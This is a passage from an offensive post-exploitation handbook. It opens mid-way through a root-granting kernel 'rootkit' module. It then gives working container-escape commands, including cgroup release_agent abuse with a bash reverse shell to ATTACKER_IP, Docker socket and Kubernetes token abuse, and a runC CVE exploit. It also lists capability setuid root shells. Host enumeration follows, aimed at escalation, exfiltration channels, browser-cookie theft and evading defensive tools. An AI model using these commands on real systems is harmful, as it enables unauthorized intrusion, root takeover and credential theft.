    creds->egid.val = 0;
    commit_creds(creds);
    return 0;
}

static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# Compile
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

# Load module
insmod rootkit.ko

# Spawn root shell
bash
```

### Capability-Based Binary Exploitation

**[Unverified]** Exploitation success depends on how the binary uses its capabilities and what functionality it exposes.

```bash
# General pattern for interpreted language binaries with caps
# Python example
/usr/bin/python3.x -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# Ruby
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node.js (if has cap_setuid)
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: "inherit"})'
```

## Container Escape Techniques

### Docker Socket Exposure

When Docker socket is mounted inside container (`/var/run/docker.sock`).

```bash
# Check for Docker socket
ls -la /var/run/docker.sock

# Install Docker client inside container
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh

# Or use static binary
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
tar xzvf docker-20.10.9.tgz
cp docker/docker /usr/bin/

# List host containers
docker -H unix:///var/run/docker.sock ps -a

# Create privileged container with host filesystem mounted
docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host --net=host -v /:/host alpine chroot /host

# Alternative: run with specific host path mount
docker -H unix:///var/run/docker.sock run -it --rm -v /:/mnt alpine

# In new container
chroot /mnt
# Now on host filesystem
cat /etc/shadow
```

### Privileged Container Escape

Privileged containers have nearly all capabilities and can access host devices.

```bash
# Check if running privileged
ip link add dummy0 type dummy 2>/dev/null && echo "Privileged" || echo "Not privileged"

# Check capabilities
capsh --print

# Method 1: Direct device access
# List block devices
fdisk -l

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Method 2: cgroup release_agent exploitation
# Check if vulnerable
cat /proc/1/cgroup
# Look for cgroup mount point

# Create payload
mkdir /tmp/exploit
echo '#!/bin/bash' > /tmp/exploit/payload.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /tmp/exploit/payload.sh
chmod +x /tmp/exploit/payload.sh

# Exploit cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/tmp/exploit/payload.sh" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### CAP_SYS_ADMIN Container Escape

Containers with `CAP_SYS_ADMIN` can mount filesystems and exploit cgroups.

```bash
# Verify capability
capsh --print | grep sys_admin

# cgroup notify_on_release exploit
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Create reverse shell payload on host (path relative to host)
cat > /cmd << EOF
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod a+x /cmd

# Trigger release agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Writable /var/run/docker.sock with curl

When Docker socket exists but Docker client unavailable.

```bash
# Create container with host mount via API
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create

# Returns container ID: {"Id":"CONTAINER_ID",...}

# Start container
curl -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/CONTAINER_ID/start

# Execute command in container
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","bash","-c","cat /etc/shadow"]}' \
  http://localhost/containers/CONTAINER_ID/exec

# Get exec ID and start
curl -X POST --unix-socket /var/run/docker.sock \
  http://localhost/exec/EXEC_ID/start
```

### Kubernetes Container Escape

**Service Account Token Access:**

```bash
# Service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# API server endpoint
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

# Query API
curl -H "Authorization: Bearer $TOKEN" --insecure $APISERVER/api/v1/namespaces/default/pods

# Check permissions
curl -H "Authorization: Bearer $TOKEN" --insecure \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'
```

**Host Path Mount Exploitation:**

```bash
# Check for host mounts
mount | grep "/host"
df -h

# If host path mounted
chroot /hostpath
```

**Creating Privileged Pod (if permissions allow):**

```bash
cat > privpod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: privpod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: privcontainer
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Apply with kubectl or via API
curl -H "Authorization: Bearer $TOKEN" --insecure \
  -H "Content-Type: application/yaml" \
  -X POST --data-binary @privpod.yaml \
  $APISERVER/api/v1/namespaces/default/pods
```

### runC Container Escape (CVE-2019-5736)

Exploits vulnerability in runC allowing malicious container to overwrite host runC binary.

```bash
# Clone exploit
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
cd CVE-2019-5736-PoC

# Modify payload in main.go
# Change payload variable to desired command

# Compile
CGO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' .

# Transfer to container
# Execute in container - wait for host to exec into container
./CVE-2019-5736-PoC
```

### Namespace Breakout Techniques

**PID Namespace Escape:**

```bash
# Check if in PID namespace
ls -la /proc/1/root

# If /proc/1/root is host root
ls /proc/1/root

# Access host filesystem
cat /proc/1/root/etc/shadow

# Execute on host via /proc
echo "payload" > /proc/1/root/tmp/.payload
```

**Mount Namespace Manipulation:**

```bash
# If CAP_SYS_ADMIN or privileged
nsenter --mount=/proc/1/ns/mnt -- /bin/bash

# Now in host mount namespace
```

### LXC/LXD Container Escape

**LXD Group Privilege Escalation:**

```bash
# Check if user in lxd group
id

# Initialize LXD if needed
lxd init

# Download Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Import image
lxc image import ./alpine*.tar.gz --alias alpine

# Create privileged container with host disk
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# In container
cd /mnt/root/root
cat .ssh/id_rsa
```

---

**Important Related Topics:**

- **Windows Token Privileges**: SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege exploitation
- **Linux Namespace Internals**: Understanding PID, mount, network, UTS namespaces for container security
- **Kernel Exploitation**: When capabilities and container escapes fail, kernel vulnerabilities provide alternate paths
- **Process Injection Techniques**: Complementary to token manipulation for post-exploitation
- **Seccomp/AppArmor Bypass**: Additional container security layers that may require circumvention

---

## System Information Gathering

Comprehensive system reconnaissance establishes the operational environment, identifies potential privilege escalation vectors, and informs persistence mechanism selection.

**Operating System Identification**

Determine OS type, version, and patch level:

```bash
# Linux/Unix OS information
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a
hostnamectl
cat /proc/version

# Distro-specific version files
cat /etc/*-release
cat /etc/redhat-release  # RHEL/CentOS
cat /etc/debian_version  # Debian/Ubuntu
cat /etc/slackware-version  # Slackware
cat /etc/arch-release  # Arch Linux
```

Windows OS enumeration:

```powershell
# System information
systeminfo
Get-ComputerInfo
Get-WmiObject -Class Win32_OperatingSystem | Select-Object *
$PSVersionTable
Get-Host

# Edition and build
(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName).ProductName
(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuild).CurrentBuild

# Patch level
Get-HotFix
Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object HotFixID, Description, InstalledOn
```

**Kernel Version and Patches**

Extract kernel-specific information for exploit targeting:

```bash
# Kernel version
uname -r
cat /proc/version
cat /proc/cmdline

# Kernel parameters
sysctl -a
cat /proc/sys/kernel/*

# Kernel modules (potential privilege escalation vectors)
lsmod
cat /proc/modules
modinfo [module_name]

# Kernel compile options
cat /boot/config-$(uname -r) 2>/dev/null

# ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full

# DEP/NX status
dmesg | grep -i "NX\|DEP"
```

**System Architecture and Capabilities**

Identify hardware limitations and features:

```bash
# CPU information
uname -m
getconf LONG_BIT
lscpu
cat /proc/cpuinfo

# Memory information
free -h
cat /proc/meminfo
vmstat

# Disk information
df -h
lsblk
fdisk -l
mount

# Device information
lspci
lsusb
hwinfo --short

# SELinux/AppArmor status
getenforce  # SELinux
aa-status   # AppArmor
```

**Hostname and Network Configuration**

Extract network identity information:

```bash
# Hostname
hostname
hostname -f
hostname -d
cat /etc/hostname

# Network interfaces
ip addr
ifconfig
ip link show

# Network configuration files
cat /etc/network/interfaces
cat /etc/sysconfig/network-scripts/ifcfg-*
cat /etc/hosts
cat /etc/resolv.conf

# DNS configuration
systemctl status systemd-resolved
resolvectl status
cat /etc/resolv.conf
```

**Timezone and Locale Configuration**

Determine system locale settings (useful for targeted exploitation):

```bash
# Timezone
date
timedatectl
cat /etc/timezone
ls -la /etc/localtime

# Locale settings
locale
localectl
cat /etc/locale.conf
echo $LANG

# System time synchronization
timedatectl
systemctl status systemd-timesyncd
ntpq -p
```

**Container and Virtualization Detection**

Identify if system runs in container or VM:

```bash
# Docker container detection
cat /.dockerenv
cat /proc/1/cgroup | grep docker
mount | grep -i docker

# Kubernetes pod detection
cat /var/run/secrets/kubernetes.io/serviceaccount/token
env | grep KUBERNETES

# Virtualization detection
systemd-detect-virt
cat /proc/cpuinfo | grep hypervisor
dmesg | grep -i "hypervisor\|kvm\|vmware\|virtualbox"

# Check for VM processes
ps aux | grep -E "qemu|kvm|vmware|vbox|xen"
```

**Boot Configuration and GRUB Parameters**

Extract bootloader information:

```bash
# GRUB configuration
cat /boot/grub/grub.cfg
cat /etc/default/grub

# Boot parameters
cat /proc/cmdline

# Boot messages
dmesg
journalctl -b
journalctl --since today

# Secure Boot status
dmesg | grep -i "secure boot"
cat /sys/firmware/efi/fw_platform_size 2>/dev/null
```

**System Uptime and Load**

Assess system runtime characteristics:

```bash
# Uptime
uptime
w
last reboot
journalctl --boot

# System load
uptime
top -b -n 1
cat /proc/loadavg

# Process accounting (if enabled)
lastcomm | head -50
```

**Environment Variables**

Extract environment configuration:

```bash
# All environment variables
env
printenv

# Specific variables
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Sensitive environment leakage (credentials in env)
env | grep -iE "password|secret|token|api|key|credential"
```

**System Resource Quotas**

Identify resource limitations:

```bash
# User limits
ulimit -a
ulimit -Ha  # Hard limits
ulimit -Sa  # Soft limits

# Process resource limits
cat /proc/[PID]/limits

# Network interface limits
ip link show | grep mtu

# Disk quotas (if configured)
quota -u
quotacheck
```

## User Privilege Enumeration

Systematic user enumeration identifies privilege escalation opportunities and lateral movement targets.

**User Account Discovery**

Enumerate all user accounts on system:

```bash
# Local user enumeration
cat /etc/passwd
getent passwd
cut -d: -f1 /etc/passwd

# Parse user information
awk -F: '{print $1, $3, $6}' /etc/passwd  # username, UID, home directory

# Active user sessions
w
who
last
lastlog

# Users with login shell
cat /etc/passwd | grep -vE "nologin|false"
```

Windows user enumeration:

```powershell
# Local user accounts
Get-LocalUser
Get-LocalUser | Select-Object Name, LastLogonDate, Enabled

# User information
net user
net user [USERNAME]

# User profiles
Get-ChildItem C:\Users

# Active sessions
query user
Get-WmiObject -Class Win32_LoggedInUser
```

**Group Membership Analysis**

Identify group affiliations and privileges:

```bash
# Groups overview
cat /etc/group
getent group

# User group membership
groups
groups [USERNAME]
id [USERNAME]

# sudo group members
getent group sudo
getent group wheel

# Parse group information
awk -F: '{print $1}' /etc/group  # all groups
grep "^sudo:" /etc/group  # sudo members
```

Windows group membership:

```powershell
# Local groups
Get-LocalGroup
Get-LocalGroupMember -Name "Administrators"
Get-LocalGroupMember -Name "Remote Desktop Users"

# Domain groups
Get-ADGroupMember -Identity "Domain Admins"
net group "Domain Admins" /domain

# Current user group membership
$([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups
Get-ADUser -Identity $env:USERNAME -Properties MemberOf | Select-Object -ExpandProperty MemberOf
```

**SUDO Privilege Analysis**

Comprehensive sudo configuration enumeration:

```bash
# List SUDO privileges
sudo -l
sudo -l -U [USERNAME]
sudo -l -l  # Long format with command details

# SUDO configuration files
cat /etc/sudoers
cat /etc/sudoers.d/*
ls -la /etc/sudoers.d/

# SUDO logs (if logging enabled)
grep -i "sudo" /var/log/auth.log
grep -i "sudo" /var/log/secure
journalctl SYSLOG_IDENTIFIER=sudo

# Analyze SUDO rules for privilege escalation
# Look for:
# - NOPASSWD entries
# - Wildcard commands
# - Commands with user-controllable parameters
```

**File Ownership and Permission Analysis**

Identify exploitable file permissions:

```bash
# Files owned by current user
find / -user $(whoami) -type f 2>/dev/null

# World-writable files
find / -perm -002 -type f 2>/dev/null

# SUID binaries (privilege escalation vectors)
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -ls 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Files writable by group
find / -perm -020 -type f 2>/dev/null

# Recent SUID changes
find / -perm -4000 -type f -mtime -7 2>/dev/null
```

**Sudo Configuration Exploit Vectors**

Identify exploitable sudo configurations:

```bash
# NOPASSWD entries
sudo -l | grep NOPASSWD

# Wildcard commands
sudo -l | grep "\*"

# Commands with arguments
# Example: (root) /usr/bin/find
# Exploitable via: sudo find / -exec bash \;

# Test exploitation
sudo -l | grep -E "find|sed|awk|grep|cat|head|tail|less|more" 

# Commands with environment preservation
sudo -l | grep "env_keep"
```

**File Capabilities Analysis**

Check for exploitable Linux capabilities:

```bash
# List file capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid, cap_setgid: Enable privilege escalation
# cap_dac_override: Override file permissions
# cap_net_raw: Raw socket creation

# Example: Python with cap_setuid
# Allows executing system commands as root
getcap -r /usr/bin/python*

# Exploit capability-based escalation
python -c "import os; os.setuid(0); os.system('/bin/bash')"
```

**Root/Administrator Privilege Status**

Verify current privilege level:

```bash
# Linux privilege check
id
whoami
sudo -n true && echo "Can run sudo without password"

# Windows privilege check
$principal = New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
$principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

# Check for system privileges
whoami /all /fo list
```

**Password Policy Analysis**

Enumerate password requirements and expiration:

```bash
# Password policy information
cat /etc/login.defs | grep PASS

# Shadow file examination (requires root)
cat /etc/shadow | head -5

# User password age
chage -l [USERNAME]

# System-wide password requirements
cat /etc/pam.d/common-password
cat /etc/security/pwquality.conf
```

Windows password policy:

```powershell
# Local password policy
Get-LocalUser | Select-Object Name, PasswordExpires, PasswordLastSet

# Domain password policy
Get-ADDefaultDomainPasswordPolicy

# Group policy (requires access)
gpresult /h report.html
# Search for "Password Policy"
```

**Account Lockout Mechanisms**

Determine account lockout threshold and duration:

```bash
# Pam configuration
cat /etc/pam.d/* | grep -i "unlock\|lockout"

# Failed login tracking
lastb  # Failed login attempts
faillog

# Lockout threshold (if configured)
grep -r "unlock" /etc/security/
```

Windows lockout policy:

```powershell
# Domain password policy lockout settings
Get-ADDefaultDomainPasswordPolicy | Select-Object *

# Account lockout threshold
net accounts /domain | grep -i "lockout"

# Attempt threshold
Get-LocalUser | Select-Object Name, Enabled
```

## Network Connection Enumeration

Comprehensive network reconnaissance identifies service exposure, lateral movement opportunities, and data exfiltration channels.

**Active Network Connections**

Enumerate established and listening connections:

```bash
# Display all connections and listening ports
netstat -tlnp
netstat -tuln

# Using ss (more modern)
ss -tlnp
ss -tunap

# IPv6 connections
ss -tln6p
netstat -tln6p

# Connection statistics
netstat -s
ss -s

# Display process associated with connection
lsof -i -P -n | grep LISTEN
fuser -n tcp -l
```

Windows network connections:

```powershell
# All connections
Get-NetTCPConnection
Get-NetUDPEndpoint

# Listening ports with associated process
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess, @{Name="ProcessName";Expression={(Get-Process -Id $_.OwningProcess).Name}}

# Detailed connection information
netstat -ano
netstat -abnoe

# Established connections
Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
```

**Routing Configuration**

Extract system routing table and gateway information:

```bash
# Routing table
route -n
ip route show
ip route show table all

# Default gateway
route -n | grep UG
ip route show | grep default

# Network interfaces and gateways
ip addr show
ifconfig

# DNS configuration
cat /etc/resolv.conf
systemd-resolve --status
```

Windows routing:

```powershell
# Routing table
Get-NetRoute
Get-NetRoute -DestinationPrefix "0.0.0.0/0"

# DNS servers
Get-DnsClientServerAddress
nslookup

# Network configuration
Get-NetIPConfiguration
ipconfig /all
```

**ARP Cache and Neighbor Discovery**

Identify network neighbors and potential MITM targets:

```bash
# ARP cache
arp -a
ip neigh show

# Watch for ARP changes
watch 'arp -a'

# Neighbor discovery
ip neigh

# Gratuitous ARP (sometimes indicates lateral movement)
tcpdump -i any -n "arp" | grep gratuitous
```

**Open Service Ports**

Identify exposed services and versions:

```bash
# Local service enumeration
netstat -tlnp | awk '{print $4, $7}'

# Service version detection
curl -v http://localhost:80
curl -v https://localhost:443
ssh -v localhost

# Banner grabbing for each service
nc localhost 22  # SSH banner
nc localhost 25  # SMTP banner
nc localhost 3306  # MySQL banner

# Comprehensive service scan
for port in $(ss -tlnp | grep -oP '(?<=:)\d+' | sort -u); do
    echo "Port $port: $(curl -s --max-time 1 http://localhost:$port 2>&1 | head -1)"
done
```

**Firewall Rules and Filtering**

Determine firewall configuration and restrictions:

```bash
# iptables rules
sudo iptables -L -n
sudo iptables -L -n -t nat
sudo iptables -L -n -t mangle

# UFW firewall
sudo ufw status
sudo ufw show added

# firewalld
sudo firewall-cmd --list-all
sudo firewall-cmd --list-services

# nftables (newer firewall framework)
sudo nft list ruleset

# Forwarding policy
cat /proc/sys/net/ipv4/ip_forward
```

Windows firewall:

```powershell
# Firewall status
Get-NetFirewallProfile
Get-NetFirewallProfile | Select-Object Name, Enabled

# Inbound rules
Get-NetFirewallRule -Direction Inbound -Enabled $true
Get-NetFirewallRule -Direction Inbound -Action Allow

# Outbound rules
Get-NetFirewallRule -Direction Outbound -Enabled $true

# Detailed rules
Get-NetFirewallRule -Direction Inbound | Get-NetFirewallRuleFilter
```

**Proxy and VPN Configuration**

Identify proxy/VPN usage for exfiltration:

```bash
# Environment proxy settings
env | grep -i proxy
echo $http_proxy
echo $https_proxy

# System-wide proxy configuration
cat /etc/environment
cat /etc/profile.d/proxy.sh

# Application-specific proxies
grep -r "proxy" /etc/apt/apt.conf.d/
grep -r "proxy" ~/.bashrc ~/.bash_profile

# VPN connections
ip route show | grep vpn
nmcli connection show
iwconfig
```

Windows proxy configuration:

```powershell
# Internet proxy settings
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer, ProxyEnable

# User proxy settings
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer

# VPN connections
Get-VpnS2SInterface
rasdial
```

**DNS Configuration and Cache**

Enumerate DNS settings for exfiltration channel identification:

```bash
# DNS servers
cat /etc/resolv.conf
systemd-resolve --status

# DNS queries (if captured)
grep -i "dns" /var/log/syslog

# nscd DNS cache
nscd -g
cat /var/cache/nscd/*

# systemd-resolved cache
systemd-resolve --statistics
```

Windows DNS:

```powershell
# DNS servers
Get-DnsClientServerAddress
ipconfig /all

# DNS cache
Get-DnsClientCache

# Recent DNS queries
Get-DnsClientCache | Select-Object Name, Data, Type
```

**Network Share Enumeration**

Identify accessible network shares for lateral movement:

```bash
# Mounted SMB shares
mount | grep cifs
mount | grep smb

# NFS mounts
showmount -e [TARGET_HOST]
mount | grep nfs

# Available shares
smbclient -L \\[HOSTNAME] -N
smbclient -L //[HOSTNAME]/ -U ""

# Mounted share contents
df | grep -E "cifs|nfs"
```

Windows network shares:

```powershell
# Local shares
Get-SmbShare
Get-SmbShare | Select-Object Name, Path, Description

# Mapped drives
Get-PSDrive -PSProvider FileSystem
net use

# Network discovery
Get-NetComputerName
net view
```

**Connection Persistence and Tunneling**

Identify established persistence mechanisms:

```bash
# Listening sockets
ss -tlnp
netstat -tlnp

# Process network connections
cat /proc/[PID]/net/tcp
cat /proc/[PID]/net/udp

# IPv4 and IPv6
cat /proc/net/tcp
cat /proc/net/tcp6

# TCP connections state tracking
grep -E "01|04" /proc/net/tcp  # ESTABLISHED (01), TIME_WAIT (04)
```

## Installed Software Discovery

Comprehensive software inventory informs privilege escalation, lateral movement, and persistence opportunities.

**Package Manager Enumeration**

Identify installed packages and available updates:

```bash
# Debian/Ubuntu packages
dpkg -l
apt list --installed
apt-cache search ".*"

# Package version information
apt-cache policy [PACKAGE_NAME]
dpkg -l | grep [PACKAGE_NAME]

# RHEL/CentOS packages
rpm -qa
yum list installed
dnf list installed

# Arch Linux packages
pacman -Q
pacman -Ss

# Installed package size
dpkg-query -W -f='${Installed-Size}\t${Package}\n' | sort -rn
```

Windows installed software:

```powershell
# Installed applications
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# 64-bit applications
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Combined
wmic product list brief
wmic product list full | findstr "Name"

# Recently installed
Get-WmiObject -Class Win32_Product | Select-Object Name, Version, InstallDate | Sort-Object InstallDate -Descending | head -20
```

**Version Detection for CVE Correlation**

Extract software versions for vulnerability research:

```bash
# Critical software versions
php --version
python --version
ruby --version
node --version
java -version
gcc --version

# Web server versions
apache2ctl -v
nginx -v
curl http://localhost -I | grep Server

# Database versions
mysql --version
psql --version
sqlite3 --version

# Scripting engine versions
perl --version
bash --version
sh --version

# Parse versions for CVE lookup
#!/bin/bash
PACKAGES=("openssh" "openssl" "sudo" "curl" "wget" "vim" "nano")
for pkg in "${PACKAGES[@]}"; do
    VERSION=$(dpkg -l | grep "^ii" | awk -v p="$pkg" '$2 ~ p {print $3}')
    echo "$pkg: $VERSION"
done
```

**Custom and Manually Installed Software**

Discover non-package-manager installations:

```bash
# Binaries in common directories
ls -la /opt/
ls -la /usr/local/
ls -la /srv/
ls -la /home/*/

# User-installed applications
find $HOME -type f -executable 2>/dev/null | head -20

# Application directories
find / -name "applications" -o -name "app" -o -name "apps" 2>/dev/null

# Python packages (if interpreter present)
pip list
pip freeze

# Node.js packages
npm list -g
npm ls

# Ruby gems
gem list
```

**Development Tools and Compilers**

Identify tools enabling code compilation and exploitation:

```bash
# Compilers present
which gcc g++ clang cc
which javac
which rustc
which go

# Build tools
which make cmake
which cargo npm pip

# Scripting interpreters
which python python2 python3
which perl ruby node bash sh
which php

# Debugging tools
which gdb lldb strace ltrace

# Version information
gcc --version
make --version
python --version
```

**Server Software and Web Applications**

Enumerate hosted services and applications:

```bash
# Web servers
ps aux | grep -E "apache|nginx|httpd|lighttpd"

# Application servers
ps aux | grep -E "tomcat|jetty|gunicorn|uwsgi|node"

# Database servers
ps aux | grep -E "mysql|postgresql|mongodb|redis"

# Service ports and associated software
netstat -tlnp | grep LISTEN
ss -tlnp | grep LISTEN

# Web application directories
ls -la /var/www/
ls -la /srv/
ls -la /opt/

# Application version detection via web interface
curl -I http://localhost/
curl -I http://localhost/admin/
grep -r "version" /var/www/ 2>/dev/null | head -20
```

**Vulnerable Software Detection**

Identify known vulnerable packages:

```bash
# Automated vulnerability scanning
sudo apt-cache policy openssh-client
apt-cache show openssh-client | grep Version

# Manual CVE correlation
# Cross-reference software versions with CVE databases

#!/bin/bash
# Check for known vulnerable software
VULNERABLE_PACKAGES=("struts2" "log4j" "OpenSSL" "sudo" "sudo" "vim")
for pkg in "${VULNERABLE_PACKAGES[@]}"; do
    echo "[*] Checking $pkg:"
    dpkg -l | grep -i "$pkg" || echo "Not installed"
done

# Historical CVE matching
# Example: OpenSSL < 1.0.2 (Heartbleed vulnerability)
# Example: sudo < 1.8.28 (Heap-based buffer overflow)
```

**Browser and Email Client Detection**

Identify communication tools for credential harvesting:

```bash
# Browser installation
which firefox chromium-browser google-chrome opera brave-browser
ls ~/.mozilla/firefox/ 2>/dev/null
ls ~/.config/chromium/ 2>/dev/null

# Browser cache and cookies
find ~/.mozilla ~/.config/chromium -name "cookies*" 2>/dev/null
find ~/.mozilla ~/.config/chromium -name "*cache*" 2>/dev/null

# Email clients
which thunderbird evolution mutt evolution
ps aux | grep -E "thunderbird|evolution|mutt"

# Email configuration
find ~ -name ".config/evolution" -o -name ".thunderbird" 2>/dev/null
```

**Privilege Escalation Tool Detection**

Identify exploitation tools already on system:

```bash
# SUID binaries (privilege escalation vectors)
find / -perm -4000 2>/dev/null

# Exploitable SUID binaries
# LinPEAS script automated check
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -E "find|sed|awk|grep|cat|python|perl"

# Kernel exploits pre-compiled
find / -name "*kernel*" -o -name "*exploit*" 2>/dev/null | grep -v ".git"

# Reverse shell tools
which nc ncat netcat
which socat
which perl python
```

**System Monitoring and Logging Software**

Detect defensive tools:

```bash
# Antivirus/HIPS
ps aux | grep -iE "antivirus|hips|defender|sentinel|osquery"
which clamav
which aide

# Log aggregation
ps aux | grep -E "syslog|fluentd|logstash"

# EDR (Endpoint Detection and Response)
ps aux | grep -E "crowdstrike|carbon|endpoint|osquery"

# Intrusion detection
which suricata snort zeek

# File integrity monitoring
aide --config=/etc/aide/aide.conf --check
tripwire --check
```

**Persistence Mechanisms and Startup Services**

Identify currently active persistence mechanisms for avoidance:

```bash
# Startup services
systemctl list-unit-files
systemctl list-units --type service --state running

# rc.d services
ls -la /etc/rc.d/
ls -la /etc/init.d/

# Cron jobs (system-level)
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# User cron jobs
crontab -l

# Systemd timers
systemctl list-timers

# Boot scripts
ls -la /etc/rc.local
cat /etc/rc.local
```

Windows startup mechanisms:

```powershell
# Startup services
Get-Service | Where-Object {$_.StartType -eq "Automatic"}
Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, StartMode

# Scheduled tasks
Get-ScheduledTask
Get-ScheduledTask | Get-ScheduledTaskInfo | Sort-Object LastRunTime -Descending

# Startup folder
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"

# Registry run keys
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
```

**Software Inventory Report Generation**

Create comprehensive software inventory:

```bash
#!/bin/bash
# software_inventory.sh

OUTPUT="software_inventory_$(date +%Y%m%d_%H%M%S).txt"

{
    echo "=== System Software Inventory ==="
    echo "Date: $(date)"
    echo "Hostname: $(hostname)"
    echo ""
    
    echo "=== Installed Packages ==="
    if command -v dpkg &> /dev/null; then
        echo "[Debian/Ubuntu Packages]"
        dpkg -l | grep "^ii"
    elif command -v rpm &> /dev/null; then
        echo "[RPM Packages]"
        rpm -qa
    fi
    echo ""
    
    echo "=== Running Services ==="
    systemctl list-units --type service --state running
    echo ""
    
    echo "=== Open Ports ==="
    ss -tlnp
    echo ""
    
    echo "=== Development Tools ==="
    which gcc g++ clang make cmake python3 perl node npm
    echo ""
    
    echo "=== Vulnerable Software Check ==="
    for pkg in openssh openssl sudo curl wget; do
        dpkg -l | grep "$pkg" || echo "$pkg: Not installed"
    done
    
} > "$OUTPUT"

echo "[+] Inventory saved to: $OUTPUT"
```

---

**Related Post-Exploitation Topics**

- **Credential Extraction and Dumping**: LSASS, SAM, shadow file analysis
- **Persistence Mechanism Installation**: Backdoor deployment, rootkit installation
- **Lateral Movement Planning**: Identified targets and exploitation vectors
- **Data Exfiltration Channel Identification**: Outbound connectivity analysis
- **Anti-Forensics and Log Tampering**: Covering tracks and destroying evidence

---

## Running Process Analysis

### Linux Process Analysis

**Basic Process Enumeration**

```bash
# Detailed process listing
ps aux
ps -ef
ps auxf  # Tree format with hierarchy
ps -eFH  # Full format with threads

# Process with full command line
ps -eww
ps aux --no-headers

# Processes by user
ps -u root
ps -U username

# Processes using most CPU
ps aux --sort=-%cpu | head -20

# Processes using most memory
ps aux --sort=-%mem | head -20

# All processes with thread count
ps -eLf

# Processes with security context
ps auxZ  # SELinux
ps auxz  # AppArmor
```

**Process Tree Analysis**

```bash
# Full process tree
pstree -p  # With PIDs
pstree -pa  # With arguments
pstree -pua  # With user and arguments
pstree -ps <PID>  # Specific process ancestry

# Alternative tree view
